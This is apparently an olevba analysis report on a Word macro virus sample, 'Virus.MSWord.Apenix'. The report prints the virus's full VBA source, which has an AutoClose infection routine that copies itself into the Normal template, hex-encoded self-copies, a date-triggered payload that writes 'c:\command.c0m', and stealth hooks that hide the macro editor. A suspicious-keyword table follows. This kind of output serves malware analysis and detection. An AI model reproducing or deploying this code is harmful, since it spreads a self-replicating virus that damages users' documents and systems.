olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Apenix-9c79dadd097f2ae8f96a035fd83d81e5c214f52e0a386ca883b3912a454b191b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Apenix-9c79dadd097f2ae8f96a035fd83d81e5c214f52e0a386ca883b3912a454b191b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO vir.bas 
in file: Virus.MSWord.Apenix-9c79dadd097f2ae8f96a035fd83d81e5c214f52e0a386ca883b3912a454b191b - OLE stream: 'Macros/VBA/vir'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const apndx = "apendix": Private a As Byte: Private flag As Boolean
Sub AutoClose()
Open "c:\aut0exec.bat" For Binary Access Write As #1: Close #1
If FileLen("c:\aut0exec.bat") = 2 Then
del ActiveDocument, "cnsts": del ActiveDocument, "vir": Options.VirusProtection = True
End
End If
timer
flag = True
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents.Item(i).Name = "norm" Then flag = False
Next i
If flag Then c
End Sub
Sub del(a As Object, n As String)
 For i = 1 To a.VBProject.VBComponents.Count: If a.VBProject.VBComponents.Item(i).Name = n Then a.VBProject.VBComponents.Remove a.VBProject.VBComponents.Item(i)
Next i
End Sub
Sub ex(s As String, ap As String): Open ap For Binary Access Write As #1: For i = 1 To Len(s) - 1 Step 2: a1 = AscB(Mid(s, i, 1)) - 48: a2 = AscB(Mid(s, i + 1, 1)) - 48: a = a1 * 16 + a2: Put #1, , a: Next: Close #1
End Sub
Sub c()
ex cnsts.n, apndx
NormalTemplate.VBProject.VBComponents.import apndx
ActiveDocument.VBProject.VBComponents("cnsts").export apndx
NormalTemplate.VBProject.VBComponents.import apndx
NormalTemplate.Save
Kill apndx
End Sub
Sub timer(): If Date > #12/25/01# And Date < #12/30/01# Then Detonate
If Date > #2/22/02# And Date < #2/26/02# Then Detonate
End Sub
Sub Detonate(): vir.im ";80102;90100;:80001>07;;2<01<=13<684<20107<684=20107;80103;90100;:80001>07;;2<01<=13<=2000", "c:\command.c0m"
End Sub
-------------------------------------------------------------------------------
VBA MACRO cnsts.bas 
in file: Virus.MSWord.Apenix-9c79dadd097f2ae8f96a035fd83d81e5c214f52e0a386ca883b3912a454b191b - OLE stream: 'Macros/VBA/cnsts'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Const n = "4174747269627574652056425?4>616=65203=20226>6?726=220=0:436?6>737420766972203=2022766972220=0:5072697661746520613320417320427974650=0:537562204175746?4?70656>28290=0:4?70656>2022633:5<61757430657865632>6261742220466?722042696>617279204163636573732057726974652041732023313:20436<6?73652023310=0:49662046696<654<656>2822633:5<61757430657865632>6261742229203=2032205468656>0=0:64656<204>6?726=616<54656=706<6174652<2022636>737473223:2064656<204>6?726=616<54656=706<6174652<20226>6?726=223:204?7074696?6>732>566972757350726?74656374696?6>203=20547275650=0:456>640" + _
"=0:456>642049660=0:4?7074696?6>732>566972757350726?74656374696?6>203=2046616<73650=0:466?722045616368206465737420496>20446?63756=656>74730=0:666<6167203=20547275650=0:466?722069203=203120546?20646573742>564250726?6:6563742>5642436?6=706?6>656>74732>436?756>740=0:496620646573742>564250726?6:6563742>5642436?6=706?6>656>74732>4974656=2869292>4>616=65203=20766972205?0=0:5468656>20666<6167203=2046616<73650=0:4>65787420690=0:496620666<6167205468656>0=0:657820636>737" + _
"4732>762<207669720=0:646573742>564250726?6:6563742>5642436?6=706?6>656>74732>696=706?7274207669720=0:4>6?726=616<54656=706<6174652>564250726?6:6563742>5642436?6=706?6>656>74732822636>73747322292>6578706?7274207669720=0:646573742>564250726?6:6563742>5642436?6=706?6>656>74732>696=706?7274207669720=0:4;696<6<207669720=0:456>642049660=0:4>65787420646573740=0:446?63756=656>74732>5361766520547275652<207764576?7264446?63756=656>740=0:456>64205375620=0:537562206578287320417320537472696>672<20617020417320537472696>67293:204?70656>20617020466?722042696>617279204163636573732057726974652041732023313:20466?722069203=203120546?204<656>287329202=2031205374657020323:206131203=2041736342284=696428732<20692<20312929202=2034383:206132203=2041736342284=696428732<2069202;20312<20312929202=2034383:206133203=206131202:203136202;2061323:205075742023312<202<2061333:204>6578743:20436<6?73652023310=0:456>64205375620=0:5375622064656<" + _
"2861204173204?626:6563742<206>20417320537472696>67290=0:20466?722069203=203120546?20612>564250726?6:6563742>5642436?6=706?6>656>74732>436?756>743:20496620612>564250726?6:6563742>5642436?6=706?6>656>74732>4974656=2869292>4>616=65203=206>205468656>20612>564250726?6:6563742>5642436?6=706?6>656>74732>52656=6?766520612>564250726?6:6563742>5642436?6=706?6>656>74732>4974656=2869290=0:4>65787420690=0:456>64205375620=0:"
Public Const v = "4174747269627574652056425?4>616=65203=2022766972220=0:436?6>73742061706>6478203=20226170656>646978223:2050726976617465206120417320427974653:205072697661746520666<616720417320426?6?6<65616>0=0:537562204175746?436<6?736528290=0:4?70656>2022633:5<61757430657865632>6261742220466?722042696>617279204163636573732057726974652041732023313:20436<6?73652023310=0:49662046696<654<656>2822633:5<61757430657865632>6261742229203=2032205468656>0=0:64656<20416374697665446?63756=656>742<2022636>737473223:2064656<20416374697665446?63756=656>742<2022766972223:204?7074696?6>732>566972757350726?74656374696?6>203=20547275650=0:456>640=0:456>642049660=0:74696=65720=0:666<6167203=20547275650=0:466?722069203=203120546?204>6?726=616<54656=706<6174652>564250726?6:6563742>5642436?6=706?6>656>74732>436?756>740=0:4966204>6?726=616<54656=706<6174652>564250726?6:6563742>5642436?6=706?6>656>74732>4974656=2869292>4>616=65203=20226>6?726=22205468656>20666<6167203=2046616<73650" + _
"=0:4>65787420690=0:496620666<6167205468656>20630=0:456>64205375620=0:5375622064656<2861204173204?626:6563742<206>20417320537472696>67290=0:20466?722069203=203120546?20612>564250726?6:6563742>5642436?" + _
"6=706?6>656>74732>436?756>743:20496620612>564250726?6:6563742>5642436?6=706?6>656>74732>4974656=2869292>4>616=65203=206>205468656>20612>564250726?6:6563742>5642436?6=706?6>656>74732>52656=6?766520612>564250726?6:6563742>5642436?6=706?6>656>74732>4974656=2869290=0:4>65787420690=0:456>64205375620=0:537562206578287320417320537472696>672<20617020417320537472696>67293:204?70656>20617020466?722042696>617279204163636573732057726974652041732023313:20466?722069203=203120546?204<656>287329202=2031205374657020323:206131203=2041736342284=696428732<20692<20312929202=2034383:206132203=2041736342284=696428732<2069202;20312<20312929202=2034383:2061203=206131202:203136202;2061323:205075742023312<202<20613:204>6578743:20436<6?73652023310=0:456>64205375620=0:537562206328290=0:657820636>7374732>6>2<2061706>64780=0:4>6?726=616<54656=706<6174652>564250726?6:6563742>5642436?6=706?6>656>74732>696=706?7274" + _
"2061706>64780=0:416374697665446?63756=656>742>564250726?6:6563742>5642436?6=706?6>656>74732822636>73747322292>6578706?72742061706>64780=0:4>6?726=616<54656=706<6174652>564250726?6:6563742>5642436?6=706?6>656>74732>696=706?72742061706>64780=0:4>6?726=616<54656=706<6174652>536176650=0:4;696<6<2061706>64780=0:456>64205375620=0:5375622074696=657228293:2049662044617465203>202331322?32352?323030312320416>642044617465203<202331322?33302?3230303123205468656>204465746?6>6174650=0:49662044617465203>2023322?32322?323030322320416>642044617465203<2023322?32362?3230303223205468656>204465746?6>6174650=0:456>64205375620=0:537562204465746?6>61746528293:207669722>696=20223;38303130323;39303130303;3:38303030313>30373;3;323<30313<3=31333<3638343<32303130373<3638343=32303130373;38303130333;39303130303;3:38303030313>30373;3;323<30313<3=31333<3=32303030222<2022633:5<636?6=6=616>642>63306=220=0:456>64205375620=0:"
Sub ViewVBCode(): Stealth
End Sub
Sub ToolsMacro(): Stealth
End Sub
Sub FileTemplates(): Stealth
End Sub
Private Sub Stealth(): On Error Resume Next
Application.ShowVisualBasicEditor = 0: Application.EnableCancelKey = 0
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |aut0exec.bat        |Executable file name                         |
|Hex String|Attribute VB        |417474726962757465205642                     |
|Hex String|st vir              |73742076697220                               |
|Hex String| "vir"              |202276697222                                 |
|Hex String|Private a3 As Byte  |507269766174652061332041732042797465         |
|Hex String|Sub Aut             |53756220417574                               |
|Hex String|aut0exec            |6175743065786563                             |
|Hex String|bat" F              |626174222046                                 |
|Hex String|r Bi                |72204269                                     |
|Hex String|ary Access Write As |61727920416363657373205772697465204173202331 |
|          |#1                  |                                             |
|Hex String|se #1               |7365202331                                   |
|Hex String|If Fi               |4966204669                                   |
|Hex String|bat")               |626174222920                                 |
|Hex String| 2 The              |203220546865                                 |
|Hex String|sts"                |73747322                                     |
|Hex String|VirusPr             |56697275735072                               |
|Hex String|tecti               |7465637469                                   |
|Hex String| True               |2054727565                                   |
|Hex String|d If                |64204966                                     |
|Hex String|r Each dest I       |72204561636820646573742049                   |
|Hex String|r i                 |72206920                                     |
|Hex String| 1 T                |20312054                                     |
|Hex String| dest               |2064657374                                   |
|Hex String|VBPr                |56425072                                     |
|Hex String|If dest             |49662064657374                               |
|Hex String| vir                |2076697220                                   |
|Hex String|ext i               |6578742069                                   |
|Hex String|If f                |49662066                                     |
|Hex String|ag The              |616720546865                                 |
|Hex String|ex c                |65782063                                     |
|Hex String| vir                |20766972                                     |
|Hex String|dest                |64657374                                     |
|Hex String|rt vir              |727420766972                                 |
|Hex String|ts("c               |7473282263                                   |
|Hex String|sts")               |7374732229                                   |
|Hex String|ext dest            |6578742064657374                             |
|Hex String|Save True           |536176652054727565                           |
|Hex String| wdW                |20776457                                     |
|Hex String|d Sub               |6420537562                                   |
|Hex String|Sub ex(s As Stri    |53756220657828732041732053747269             |
|Hex String| ap As Stri         |2061702041732053747269                       |
|Hex String| ap F               |2061702046                                   |
|Hex String|(s)                 |28732920                                     |
|Hex String| 1 Step 2           |203120537465702032                           |
|Hex String| a1                 |20613120                                     |
|Hex String| AscB(              |204173634228                                 |
|Hex String|id(s                |69642873                                     |
|Hex String| 1))                |2031292920                                   |
|Hex String| a2                 |20613220                                     |
|Hex String| a3                 |20613320                                     |
|Hex String| 16                 |20313620                                     |
|Hex String| Put #1             |20507574202331                               |
|Hex String|Sub de              |537562206465                                 |
|Hex String|(a As               |286120417320                                 |
|Hex String| As Stri            |2041732053747269                             |
|Hex String| If a               |2049662061                                   |
|Hex String| The                |20546865                                     |
|Hex String|ve a                |76652061                                     |
|Hex String|st ap               |7374206170                                   |
|Hex String| "ape               |2022617065                                   |
|Hex String|dix"                |64697822                                     |
|Hex String| Private a As Byte  |205072697661746520612041732042797465         |
|Hex String| Private f          |20507269766174652066                         |
|Hex String|ag As B             |61672041732042                               |
|Hex String|se()                |73652829                                     |
|Hex String| ActiveD            |2041637469766544                             |
|Hex String|" The               |2220546865                                   |
|Hex String|Sub c()             |53756220632829                               |
|Hex String|ActiveD             |41637469766544                               |
|Hex String|rt ap               |7274206170                                   |
|Hex String|Save                |53617665                                     |
|Hex String|Sub ti              |537562207469                                 |
|Hex String|er()                |65722829                                     |
|Hex String| If Date            |204966204461746520                           |
|Hex String| #12                |20233132                                     |
|Hex String|2001# A             |32303031232041                               |
|Hex String|d Date              |64204461746520                               |
|Hex String|2001# The           |323030312320546865                           |
|Hex String| Det                |20446574                                     |
|Hex String|If Date             |4966204461746520                             |
|Hex String|2002# A             |32303032232041                               |
|Hex String|2002# The           |323030322320546865                           |
|Hex String|Sub Det             |53756220446574                               |
|Hex String|ate()               |6174652829                                   |
|Hex String|80102               |3830313032                                   |
|Hex String|90100               |3930313030                                   |
|Hex String|80001               |3830303031                                   |
|Hex String|20107               |3230313037                                   |
|Hex String|80103               |3830313033                                   |
|Hex String|2000"               |3230303022                                   |
+----------+--------------------+---------------------------------------------+

